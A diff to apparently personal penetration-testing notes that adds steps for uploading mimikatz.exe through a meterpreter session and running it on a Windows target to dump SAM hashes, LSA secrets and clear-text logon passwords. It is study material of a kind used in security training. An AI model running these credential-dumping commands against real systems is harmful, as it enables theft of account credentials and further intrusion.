@@ -74,3 +74,28 @@
 ### Mimikatz on the Target
 > Same scenario... If you wanted, you could upload the mimikatz Windows executable to the target (onto the target's hard drive).
 
+#### Upload mimikatz.exe
+- With your meterpreter session, navigate to the root of the target, create a Temp subdir for your files.
+```
+> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+  # Kali comes with various Windows executables, and mimikatz.exe is one of them.
+> shell
+  # gets you a cmd on the target
+```
+
+#### Run mimikatz.exe on the Target
+- In the cmd shell on the target...
+```
+dir    # should see mimikatz.exe in your Temp dir
+mimikatz.exe              # start it up... you get the mikikatz environment and prompt
+privilege::debug          # check your privs
+                          # if you get "Privilege | 20 | OK" you have sufficient privs to execute
+lsadump::sam              # should give you the cache dump: syskey, samkey, hashes
+lsadump::secrets          # same results as with kiwi in msf
+sekurlsa::logonpasswords  # IF there are clear-text pwds, you'll see them; else Password: (null).
+```
+- `sekurlsa::logonpasswords` : Some Windows systems are configured to store users' logon passwords in clear text. Mimikatz can find these.
+
+
+
+
